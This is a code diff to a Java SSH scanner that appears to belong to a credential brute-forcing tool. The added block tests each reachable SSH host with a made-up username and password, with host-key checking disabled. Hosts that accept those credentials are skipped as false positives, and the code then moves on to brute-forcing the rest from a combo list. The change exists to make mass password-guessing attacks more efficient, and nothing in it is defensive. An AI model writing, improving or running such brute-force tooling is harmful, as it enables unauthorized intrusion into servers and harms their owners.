@@ -17,6 +17,7 @@ import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.List;
 
+@SuppressWarnings("Duplicates")
 public class Scanner implements Runnable {
 
     public static int p = 0;
@@ -42,6 +43,48 @@ public class Scanner implements Runnable {
                 Socket socket = new Socket();
                 socket.connect(new InetSocketAddress(host, sshPort), timeout);
                 socket.close();
+
+
+                // <!-- START FALSE POSITIVE PREVENTION -->
+
+                    // this will basically double check to
+                    // ensure the server its about to spend
+                    // a ton of resources on bruting is not
+                    // one of those servers that requires a
+                    // username login then requires another username
+                    // and password login in the shell area causing
+                    // payne to think the first login is a correct login.
+
+                    // essentially we are going to try to login on each server with
+                    // the credentials "1moneygang123coolkidzclud:1337sexualBehaviour",
+                    // the chances these are valid credentials
+                    // are so low so if these credentials work we will filter out this
+                    // host and try again...
+
+
+                try {
+                    JSch jsch = new JSch();
+                    Session session = jsch.getSession("1moneygang123coolkidzclud", host, sshPort);
+                    session.setPassword("1337sexualBehaviour");
+                    java.util.Properties config = new java.util.Properties();
+                    config.put("StrictHostKeyChecking", "no");
+                    session.setConfig(config);
+                    session.setTimeout(4500);
+                    session.connect();
+                    session.disconnect();
+                    System.out.println(" ]Found False Positive [" + host + "]");
+                    continue;
+                } catch (JSchException e) {
+                    if (e.getMessage().contains("refused") || e.getMessage().contains("foreign host") ||
+                            e.getMessage().contains("reset") || e.getMessage().contains("reset by peer")){
+                        continue;
+                    }
+                }
+
+
+                // <!-- END FALSE POSITIVE PREVENTION -->
+
+
                 System.out.println(" ]Starting brute [" + host + "]");
 
                 List<String> combos = Files.readAllLines(Paths.get(file.getAbsolutePath()));
